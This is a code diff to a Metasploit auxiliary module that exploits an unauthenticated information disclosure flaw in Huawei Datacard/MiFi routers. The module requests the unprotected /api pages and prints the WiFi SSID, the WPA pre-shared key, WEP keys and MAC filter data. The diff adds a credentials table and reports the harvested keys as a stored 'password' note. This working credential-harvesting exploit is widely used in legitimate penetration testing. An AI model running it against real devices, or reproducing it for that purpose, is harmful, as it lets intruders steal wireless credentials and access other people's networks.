@@ -8,15 +8,15 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "Huawei Datacard, CSRF Information Disclosure Vulnerability",
+      'Name'           => "Huawei Datacard, Information Disclosure Vulnerability",
       'Description'    => %q{
-          This module exploits an un-authenticated information disclosure vulnerability in Huawei
-		SOHO routers. The module will gather information by accessing the /api pages where 
-		authentication is not required, thus allowing configuration changes 
-		as well as information disclosure including any stored SMS.
+          This module exploits an un-authenticated information disclosure vulnerability ("Direct Request", CWE-425)
+          	in Huawei SOHO routers. The module will gather information by accessing the /api pages where 
+		authentication is not required.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -31,6 +31,11 @@ class Metasploit3 < Msf::Auxiliary
           [ 'URL', 'http://www.huaweidevice.co.in/Support/Downloads/' ],
         ],
       'DisclosureDate' => "Nov 11 2013" ))
+	  
+    register_options(
+      [
+        Opt::RHOST("mobilewifi.home")
+      ], self.class)
 
   end
 
@@ -81,7 +86,7 @@ def run
     # Grabbing the wifiwpapsk
     if res.body.match(/<WifiWpapsk>(.*)<\/WifiWpapsk>/i)
       wifiwpapsk = $1
-      print_status("Wifi WPA PSK: #{wifiwpapsk}")
+      print_status("Wifi WPA pre-shared key: #{wifiwpapsk}")
     end
 
     # Grabbing the WifiAuthmode
@@ -130,7 +135,29 @@ def run
     if res.body.match(/<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i)
       wifiwepkeyindex = $1
       print_status("Wifi WEP Key Index: #{wifiwepkeyindex}")
-    end	
+    end
+	
+    credentials = Rex::Ui::Text::Table.new(
+    'Header'    	=> "\n Huawei MiFi Credentials",
+    'HeaderIndent'	=> 1,
+    'Indent'    	=> 1,
+    'Columns'   	=>
+    [
+      "Access Point",
+      "SSID",
+      "WPA Pre-shared Key",
+      "802.11 Authentication",
+      "Encryption Mode",
+      "WEP Key"
+    ])	
+	
+    credentials << [rhost, wifissid, wifiwpapsk, wifiauthmode, wifiwpaencryptionmodes, wifiwepkey1]
+
+    report_note(
+	:host => rhost,
+	:type => 'password',
+	:data => credentials
+    )	
 	
    rescue::Exception => e
 	 print_status("Ooooops: #{e.class} #{e}")	
@@ -320,6 +347,7 @@ def get_router_mac_filter_info
 		print_status("Mac: #{wifimacfiltermac}")
 	  end
     end
+	
     # Grabbing the WifiMacFilterMac1
     if res.body.match(/<WifiMacFilterMac1>(.*)<\/WifiMacFilterMac1>/i)
       wifimacfiltermac = $1
@@ -382,7 +410,7 @@ def get_router_mac_filter_info
 	  if !(wifimacfiltermac == "")
 		print_status("Mac: #{wifimacfiltermac}")
 	  end
-    end	
+    end
   end
   
 def get_router_wan_info
